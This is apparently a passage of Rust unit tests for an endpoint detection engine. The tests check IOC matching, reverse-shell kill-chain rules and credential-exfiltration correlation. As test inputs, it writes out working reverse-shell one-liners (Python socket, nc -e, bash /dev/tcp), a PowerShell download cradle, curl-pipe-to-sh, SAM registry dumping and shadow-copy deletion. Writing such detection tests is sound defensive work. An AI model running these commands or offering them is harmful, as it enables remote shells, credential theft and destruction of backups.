        let outcome = engine.process_event(&event);
        assert!(outcome.signals.z1_exact_ioc);
        assert!(outcome
            .layer1
            .matched_fields
            .iter()
            .any(|field| field == "file_hash"));

        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn bootstrap_low_memory_path_uses_exact_store_only_for_iocs() {
        let _env_guard = crate::lifecycle::shared_env_var_lock()
            .lock()
            .expect("env lock");
        let base = unique_temp_dir("ioc-low-memory");
        let staging_dir = base.join("staging");
        let sigma_dir = base.join("sigma");
        let yara_dir = base.join("yara");
        let ioc_dir = base.join("ioc");
        std::fs::create_dir_all(&sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&ioc_dir).expect("create ioc dir");
        std::fs::create_dir_all(&staging_dir).expect("create staging dir");
        std::fs::write(
            ioc_dir.join("hashes.txt"),
            "abc123\n# ignore this line\ndef456  # inline comment\n",
        )
        .expect("write IOC file");
        std::env::set_var("EGUARD_FORCE_LOW_MEMORY_IOC_STORE", "1");
        std::env::set_var("EGUARD_RULES_STAGING_DIR", &staging_dir);

        let sources = DetectionSourcePaths {
            sigma_dir,
            yara_dir,
            ioc_dir,
            control_plane_peers: Vec::new(),
        };
        let engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);

        assert_eq!(engine.layer1.check_hash("abc123"), Layer1Result::ExactMatch);
        assert_eq!(engine.layer1.check_hash("def456"), Layer1Result::ExactMatch);
        assert_eq!(engine.layer1.check_hash("missing"), Layer1Result::Clean);

        std::env::remove_var("EGUARD_FORCE_LOW_MEMORY_IOC_STORE");
        std::env::remove_var("EGUARD_RULES_STAGING_DIR");
        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn bootstrap_detects_windows_reg_save_sam_command() {
        let base = unique_temp_dir("win-reg-save");
        let sources = DetectionSourcePaths {
            sigma_dir: base.join("sigma"),
            yara_dir: base.join("yara"),
            ioc_dir: base.join("ioc"),
            control_plane_peers: Vec::new(),
        };
        std::fs::create_dir_all(&sources.sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&sources.yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&sources.ioc_dir).expect("create ioc dir");

        let mut engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
        let mut event = base_event();
        event.process = "reg.exe".to_string();
        event.parent_process = "cmd.exe".to_string();
        event.command_line = Some("reg save HKLM\\SAM C:\\temp-sam.hiv".to_string());

        let outcome = engine.process_event(&event);
        assert!(outcome
            .temporal_hits
            .iter()
            .any(|hit| hit == "eguard_win_reg_save_sam"));

        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn bootstrap_detects_windows_powershell_download_cradle() {
        let base = unique_temp_dir("win-ps-cradle");
        let sources = DetectionSourcePaths {
            sigma_dir: base.join("sigma"),
            yara_dir: base.join("yara"),
            ioc_dir: base.join("ioc"),
            control_plane_peers: Vec::new(),
        };
        std::fs::create_dir_all(&sources.sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&sources.yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&sources.ioc_dir).expect("create ioc dir");

        let mut engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
        let mut event = base_event();
        event.process = "powershell.exe".to_string();
        event.parent_process = "explorer.exe".to_string();
        event.command_line = Some(
            "powershell -nop -w hidden IEX (New-Object Net.WebClient).DownloadString('http://bad')"
                .to_string(),
        );

        let outcome = engine.process_event(&event);
        assert!(outcome
            .temporal_hits
            .iter()
            .any(|hit| hit == "eguard_win_ps_download_cradle"));

        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn bootstrap_detects_windows_shadow_delete_command() {
        let base = unique_temp_dir("win-shadow-delete");
        let sources = DetectionSourcePaths {
            sigma_dir: base.join("sigma"),
            yara_dir: base.join("yara"),
            ioc_dir: base.join("ioc"),
            control_plane_peers: Vec::new(),
        };
        std::fs::create_dir_all(&sources.sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&sources.yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&sources.ioc_dir).expect("create ioc dir");

        let mut engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
        let mut event = base_event();
        event.process = "vssadmin.exe".to_string();
        event.parent_process = "cmd.exe".to_string();
        event.command_line = Some("vssadmin delete shadows /all /quiet".to_string());

        let outcome = engine.process_event(&event);
        assert!(outcome
            .temporal_hits
            .iter()
            .any(|hit| hit == "eguard_win_shadow_copy_delete"));

        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn bootstrap_sensitive_file_rule_ignores_benign_non_root_file_reads() {
        let base = unique_temp_dir("benign-file-open");
        let sources = DetectionSourcePaths {
            sigma_dir: base.join("sigma"),
            yara_dir: base.join("yara"),
            ioc_dir: base.join("ioc"),
            control_plane_peers: Vec::new(),
        };
        std::fs::create_dir_all(&sources.sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&sources.yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&sources.ioc_dir).expect("create ioc dir");

        let mut engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
        let mut event = base_event();
        event.event_class = EventClass::FileOpen;
        event.process = "hostnamectl".to_string();
        event.parent_process = "bash".to_string();
        event.file_path = Some("/usr/lib64/libseccomp.so.2".to_string());

        let outcome = engine.process_event(&event);
        assert!(outcome
            .temporal_hits
            .iter()
            .all(|hit| hit != "eguard_builtin_sensitive_file_access"));

        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn bootstrap_sensitive_file_rule_matches_real_sensitive_paths() {
        let base = unique_temp_dir("sensitive-file-open");
        let sources = DetectionSourcePaths {
            sigma_dir: base.join("sigma"),
            yara_dir: base.join("yara"),
            ioc_dir: base.join("ioc"),
            control_plane_peers: Vec::new(),
        };
        std::fs::create_dir_all(&sources.sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&sources.yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&sources.ioc_dir).expect("create ioc dir");

        let mut engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
        let mut event = base_event();
        event.event_class = EventClass::FileOpen;
        event.process = "cat".to_string();
        event.parent_process = "bash".to_string();
        event.file_path = Some("/home/user/.ssh/id_rsa".to_string());

        let outcome = engine.process_event(&event);
        assert!(outcome
            .temporal_hits
            .iter()
            .any(|hit| hit == "eguard_builtin_sensitive_file_access"));

        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn bootstrap_sensitive_file_rule_ignores_benign_sudo_policy_reads() {
        let base = unique_temp_dir("sudo-policy-read");
        let sources = DetectionSourcePaths {
            sigma_dir: base.join("sigma"),
            yara_dir: base.join("yara"),
            ioc_dir: base.join("ioc"),
            control_plane_peers: Vec::new(),
        };
        std::fs::create_dir_all(&sources.sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&sources.yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&sources.ioc_dir).expect("create ioc dir");

        let mut engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
        let mut event = base_event();
        event.event_class = EventClass::FileOpen;
        event.process = "sudo".to_string();
        event.parent_process = "bash".to_string();
        event.file_path = Some("/etc/passwd".to_string());

        let outcome = engine.process_event(&event);
        assert!(outcome
            .temporal_hits
            .iter()
            .all(|hit| hit != "eguard_builtin_sensitive_file_access"));

        let _ = std::fs::remove_dir_all(base);
    }
    fn detp1_engine(server: &str) -> detection::DetectionEngine {
        let base = unique_temp_dir("detp1");
        let config = crate::config::AgentConfig {
            server_addr: server.into(),
            detection_sigma_rules_dir: base.join("sigma").display().to_string(),
            detection_yara_rules_dir: base.join("yara").display().to_string(),
            detection_ioc_dir: base.join("ioc").display().to_string(),
            ..Default::default()
        };
        let sources = DetectionSourcePaths::from_config(&config);
        build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources)
    }

    fn detp1_shell_connection(
        engine: &mut detection::DetectionEngine,
        pid: u32,
        parent_pid: u32,
        peer: &str,
    ) -> (detection::DetectionOutcome, usize) {
        let mut parent = base_event();
        parent.process = "sh".into();
        parent.parent_process = "service".into();
        parent.pid = parent_pid;
        engine.process_event(&parent);
        let mut child = parent.clone();
        child.ts_unix += 1;
        child.pid = pid;
        child.ppid = parent_pid;
        child.process = "python3".into();
        child.parent_process = "sh".into();
        child.command_line = Some("python3 -c 'import socket,os;s=socket.socket();s.connect((h,p));os.dup2(s.fileno(),0);os.system(\"/bin/sh -i\")'".into());
        engine.process_event(&child);
        child.ts_unix += 1;
        child.event_class = EventClass::NetworkConnect;
        child.dst_ip = Some(peer.into());
        child.dst_port = Some(50053);
        let outcome = engine.process_event(&child);
        let mut repeats = 0;
        for _ in 0..10 {
            child.event_class = EventClass::FileOpen;
            child.file_path = Some("/usr/lib/python3/module.py".into());
            repeats += engine
                .process_event(&child)
                .kill_chain_hits
                .iter()
                .filter(|hit| *hit == "killchain_reverse_shell")
                .count();
        }
        (outcome, repeats)
    }

    #[test]
    fn detp1_control_plane_excludes_only_agent_lineage_and_marks_other_connections() {
        let server = "198.51.100.20:50053";
        let own_pid = std::process::id();
        for (pid, parent_pid) in [(own_pid, 100), (own_pid + 1, own_pid)] {
            let mut engine = detp1_engine(server);
            let (outcome, repeats) =
                detp1_shell_connection(&mut engine, pid, parent_pid, "198.51.100.20");
            assert!(!outcome
                .kill_chain_hits
                .iter()
                .any(|hit| hit == "killchain_reverse_shell"));
            assert_eq!(repeats, 0);
        }
        for (peer, expected_flag) in [("198.51.100.20", true), ("203.0.113.7", false)] {
            let mut engine = detp1_engine(server);
            let (outcome, repeats) = detp1_shell_connection(&mut engine, 201, 200, peer);
            assert_eq!(
                outcome
                    .kill_chain_hits
                    .iter()
                    .filter(|hit| *hit == "killchain_reverse_shell")
                    .count(),
                1
            );
            assert_eq!(repeats, 0);
            // Keep the RED-on-base test source compatible with the pre-evidence API.
            assert!(format!("{outcome:?}")
                .contains(&format!("peer_is_configured_server: {expected_flag}")));
        }
        let mut engine = detp1_engine(server);
        let mut parent = base_event();
        parent.pid = 200;
        parent.process = "sh".into();
        engine.process_event(&parent);
        let mut impersonator = parent.clone();
        impersonator.pid = 201;
        impersonator.ppid = 200;
        impersonator.process = "eguard-agent".into();
        impersonator.command_line = Some("bash -i >& /dev/tcp/H/P 0>&1".into());
        impersonator.parent_process = "sh".into();
        impersonator.ts_unix += 1;
        engine.process_event(&impersonator);
        impersonator.ts_unix += 1;
        impersonator.event_class = EventClass::NetworkConnect;
        impersonator.dst_ip = Some("198.51.100.20".into());
        impersonator.dst_port = Some(50053);
        assert!(engine
            .process_event(&impersonator)
            .kill_chain_hits
            .iter()
            .any(|hit| hit == "killchain_reverse_shell"));
    }
    #[test]
    fn detp1_broad_strings_are_features_while_reverse_shell_patterns_remain_decisions() {
        let mut engine = detection::DetectionEngine::default_with_rules();
        super::seed_string_signatures(&mut engine);
        for (process, command) in [
            ("python3", "python3 -c 'print(1)'"),
            ("modprobe", "modprobe veth"),
            ("base64", "base64 -d input.txt"),
            ("python3", "python3 -c 'import os;os.dup2(1,2)'"),
            ("systemctl", "systemctl enable normal.service"),
        ] {
            let mut event = base_event();
            event.process = process.into();
            event.parent_process = "service".into();
            event.command_line = Some(command.into());
            let outcome = engine.process_event(&event);
            assert!(
                outcome.layer1.prefilter_hit,
                "retain scoring feature: {command}"
            );
            assert!(
                outcome.layer1.matched_signatures.is_empty(),
                "broad string is not a positive decision: {command}"
            );
            assert!(crate::lifecycle::AgentRuntime::detection_rule_name(&outcome).is_none());
            assert_eq!(outcome.confidence, detection::Confidence::None);
            assert!(!outcome
                .ml_score
                .as_ref()
                .is_some_and(|score| score.positive));
        }
        for command in [
            "python3 -c 'import socket,os;s=socket.socket();s.connect((\"198.51.100.7\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.system(\"/bin/sh -i\")'",
            "nc -e /bin/sh 198.51.100.7 4444",
            "bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'",
        ] {
            let mut event = base_event();
            event.command_line = Some(command.into());
            let outcome = engine.process_event(&event);
            assert!(!outcome.layer1.matched_signatures.is_empty(), "specific malicious pattern stays positive");
            assert!(crate::lifecycle::AgentRuntime::detection_rule_name(&outcome).is_some());
        }
    }
    #[test]
    fn detp1_python_context_without_payload_has_no_named_signature() {
        let mut engine = detection::DetectionEngine::default_with_rules();
        super::seed_string_signatures(&mut engine);
        for command in [
            "python3 -c 'import json,sys;print(json.load(sys.stdin))'",
            "python3 -c 'import base64;print(base64.b64encode(b\"x\"))'",
            "base64 -d file",
            "python3 -c 'import base64;print(base64.b64decode(payload))'",
            "python3 -c 'exec(payload)'",
            "python3 -c 'import socket;s=socket.socket();s.connect((\"198.51.100.7\",4444))'",
            "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"198.51.100.7\",4444));subprocess.call([\"/bin/sh\",\"-i\"])'",
        ] {
            let mut event = base_event();
            event.command_line = Some(command.into());
            let hit = engine.layer1.check_event(&event);
            assert!(hit.matched_signatures.is_empty(), "{command}");
        }
    }

    #[test]
    fn detp1_python_socket_stdio_variants_have_named_signature() {
        let engine = detection::DetectionEngine::default_with_rules();
        for command in [
            "python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"198.51.100.10\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
            "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"198.51.100.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
        ] {
            let mut event = base_event();
            event.command_line = Some(command.into());
            let hit = engine.layer1.check_event(&event);
            assert!(hit.matched_signatures.iter().any(|name| name == "python_socket_stdio_reverse_shell"), "{command}");
        }
    }

    #[test]
    fn detp1_python_exec_base64_variants_have_named_signature() {
        let engine = detection::DetectionEngine::default_with_rules();
        for command in [
            "python3 -c 'import base64;exec(base64.b64decode(payload))'",
            "python3 -c \"exec(__import__('base64').b64decode(payload))\"",
        ] {
            let mut event = base_event();
            event.command_line = Some(command.into());
            let hit = engine.layer1.check_event(&event);
            assert!(
                hit.matched_signatures
                    .iter()
                    .any(|name| name == "python_exec_base64_payload"),
                "{command}"
            );
        }
    }

    fn detp1_fixture_event(
        pid: u32,
        ppid: u32,
        ts: i64,
        class: EventClass,
        process: &str,
        parent: &str,
    ) -> TelemetryEvent {
        let mut event = base_event();
        event.pid = pid;
        event.ppid = ppid;
        event.session_id = 1;
        event.ts_unix = ts;
        event.event_class = class;
        event.process = process.into();
        event.parent_process = parent.into();
        event
    }

    fn detp1_replay_count(
        engine: &mut detection::DetectionEngine,
        events: &[TelemetryEvent],
        rule: &str,
    ) -> usize {
        events
            .iter()
            .map(|event| {
                let outcome = engine.process_event(event);
                outcome
                    .temporal_hits
                    .iter()
                    .chain(&outcome.kill_chain_hits)
                    .filter(|hit| hit.as_str() == rule)
                    .count()
            })
            .sum()
    }

    fn detp1_fixture_reverse(
        process: &str,
        pid: u32,
        peer: &str,
        port: u16,
    ) -> Vec<TelemetryEvent> {
        let shell = detp1_fixture_event(pid - 1, 1, 1, EventClass::ProcessExec, "sh", "service");
        let mut exec = detp1_fixture_event(pid, pid - 1, 2, EventClass::ProcessExec, process, "sh");
        exec.command_line = Some(format!("{process} health_check.py"));
        let mut network = exec.clone();
        network.ts_unix = 3;
        network.event_class = EventClass::NetworkConnect;
        network.dst_ip = Some(peer.into());
        network.dst_port = Some(port);
        let mut events = vec![shell, exec.clone(), network];
        for i in 0..10 {
            let mut read = exec.clone();
            read.ts_unix = 4;
            read.event_class = EventClass::FileOpen;
            read.file_path = Some(format!("/usr/lib/{process}/module_{i}.py"));
            events.push(read);
        }
        events
    }

    fn agentfix28_system_file_network_replay(path: &str, delay: i64) -> usize {
        let mut engine = detp1_engine("198.51.100.20:50053");
        let mut read = detp1_fixture_event(4, 0, 1, EventClass::FileOpen, "System", "");
        read.uid = 0;
        read.file_path = Some(path.into());
        let mut network = read.clone();
        network.ts_unix += delay;
        network.event_class = EventClass::NetworkConnect;
        network.file_path = None;
        network.dst_ip = Some("10.102.1.255".into());
        network.dst_port = Some(137);
        detp1_replay_count(&mut engine, &[read, network], "phi_credential_exfil")
    }

    #[test]
    fn agentfix28_replay_cryptnet_systemprofile_does_not_exfil() {
        assert_eq!(
            agentfix28_system_file_network_replay(
                r"C:\Windows\System32\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\26C212D9399727259664BDFCA073966E_912C3CA51DE6018A7BE4CA7BC64AAFCD",
                54
            ),
            0
        );
    }

    #[test]
    fn agentfix28_replay_office_systemprofile_does_not_exfil() {
        assert_eq!(
            agentfix28_system_file_network_replay(
                r"C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Office\OTele\{BD5D4451-383D-47AE-8C81-6F717964EE12} (4) - 4720 - officeclicktorun.exe - OTele.dat",
                34
            ),
            0
        );
    }

    #[test]
    fn agentfix28_replay_system_sam_still_exfils_to_broadcast() {
        assert_eq!(
            agentfix28_system_file_network_replay(r"C:\Windows\System32\config\SAM", 54),
            1
        );
    }

    #[test]
    #[ignore = "AGENTFIX28 analysis only: Linux cron/own-server policy is not ruled"]
    fn agentfix28_analysis_linux_cron_shadow_child_to_own_server() {
        let mut read = detp1_fixture_event(2000, 1, 1, EventClass::FileOpen, "cron", "systemd");
        read.uid = 0;
        read.file_path = Some("/etc/shadow".into());
        let mut network =
            detp1_fixture_event(2001, 2000, 35, EventClass::NetworkConnect, "sh", "cron");
        network.uid = 0;
        network.dst_ip = Some("10.10.123.35".into());
        network.dst_port = Some(50053);
        let mut engine = detp1_engine("10.10.123.35:50053");
        assert_eq!(
            detp1_replay_count(
                &mut engine,
                &[read.clone(), network.clone()],
                "phi_credential_exfil"
            ),
            0,
            "FileOpen-to-network correlation requires the same PID, not a child"
        );
        // Control: the configured peer is tagged, but L2 does not exempt it.
        network.pid = read.pid;
        network.ppid = read.ppid;
        network.process = read.process.clone();
        network.parent_process = read.parent_process.clone();
        let mut engine = detp1_engine("10.10.123.35:50053");
        assert_eq!(
            detp1_replay_count(&mut engine, &[read, network], "phi_credential_exfil"),
            1
        );
    }

    #[test]
    fn detp1_phase0_replay_anonymized_groups_and_malicious_lookalikes() {
        // Five historical group shapes, not reconstructed customer commands or event IDs.
        // Group 3's missing downloader witnesses are covered separately by synthetic qualification.
        for (process, instances) in [("python3.14", 2), ("python3", 1)] {
            let mut engine = detp1_engine("198.51.100.20:50053");
            let mut total = 0;
            for i in 0..instances {
                total += detp1_replay_count(
                    &mut engine,
                    &detp1_fixture_reverse(process, 1000 + i * 2, "198.51.100.20", 50053),
                    "killchain_reverse_shell",
                );
            }
            assert_eq!(
                total, 0,
                "health checks without socket-to-stdio witnesses are not reverse shells"
            );
        }
        // Group 4: an account lookup is not secret access.
        let mut engine = detp1_engine("198.51.100.20:50053");
        let mut read = detp1_fixture_event(2000, 1999, 1, EventClass::FileOpen, "cron", "cron");
        read.file_path = Some("/etc/passwd".into());
        let mut network = read.clone();
        network.ts_unix = 2;
        network.event_class = EventClass::NetworkConnect;
        network.dst_ip = Some("198.51.100.20".into());
        network.dst_port = Some(50053);
        assert_eq!(
            detp1_replay_count(
                &mut engine,
                &[read.clone(), network.clone()],
                "phi_credential_exfil"
            ),
            0
        );
        // Package metadata is not a secret/data source; secret archives still match.
        let mut engine = detp1_engine("198.51.100.20:50053");
        engine
            .load_sigma_rule_yaml(include_str!(
                "../../../../rules/sigma/linux_data_staging_archive.yml"
            ))
            .unwrap();
        let mut archive = detp1_fixture_event(
            3000,
            2999,
            1,
            EventClass::ProcessExec,
            "tar",
            "dpkg-db-backup",
        );
        archive.command_line = Some("tar -czf /var/backups/package-db.tgz /var/lib/dpkg".into());
        assert_eq!(
            detp1_replay_count(&mut engine, &[archive], "linux_data_staging_archive"),
            0
        );
        // Real reverse-shell behavior survives both external and configured-server peers,
        // including a non-control-plane peer using the product's usual port.
        for (peer, port) in [
            ("203.0.113.7", 4444),
            ("203.0.113.7", 50053),
            ("198.51.100.20", 50053),
        ] {
            let mut engine = detp1_engine("198.51.100.20:50053");
            let mut events = detp1_fixture_reverse("python3", 4000, peer, port);
            events[1].command_line = Some("python3 -c 'import socket,os;s=socket.socket();s.connect((\"203.0.113.7\",4444));os.dup2(s.fileno(),0);os.system(\"/bin/sh -i\")'".into());
            assert_eq!(
                detp1_replay_count(&mut engine, &events, "killchain_reverse_shell"),
                1
            );
        }
        let mut engine = detp1_engine("198.51.100.20:50053");
        read.file_path = Some("/etc/shadow".into());
        assert_eq!(
            detp1_replay_count(&mut engine, &[read, network], "phi_credential_exfil"),
            1
        );
    }

    #[test]
    fn detp1_synthetic_qualification_guest_agent_download_exec_remains_enabled() {
        // SYNTHETIC QUALIFICATION sequences, not recovered customer witnesses.
        // The two historical guest-agent-context findings remain UNKNOWN.
        // This must-keep-positive fixture intentionally also passes on the base.
        for pid in [5000, 6000] {
            let mut engine = detp1_engine("198.51.100.20:50053");
            let mut downloader =
                detp1_fixture_event(pid, 10, 1, EventClass::ProcessExec, "curl", "qemu-ga");
            downloader.command_line = Some("curl https://example.invalid/payload | sh".into());
            let shell =
                detp1_fixture_event(pid + 1, 10, 2, EventClass::ProcessExec, "sh", "qemu-ga");
            assert_eq!(
                detp1_replay_count(&mut engine, &[downloader, shell], "phi_download_exec"),
                1
            );
        }
        // Malicious curl|sh outside guest-agent context must also remain positive.
        let mut engine = detp1_engine("198.51.100.20:50053");
        let mut downloader =
            detp1_fixture_event(7000, 10, 1, EventClass::ProcessExec, "curl", "service");
        downloader.command_line = Some("curl https://example.invalid/payload | sh".into());
        let shell = detp1_fixture_event(7001, 10, 2, EventClass::ProcessExec, "sh", "service");
        assert_eq!(
            detp1_replay_count(&mut engine, &[downloader, shell], "phi_download_exec"),
            1
        );
    }
}
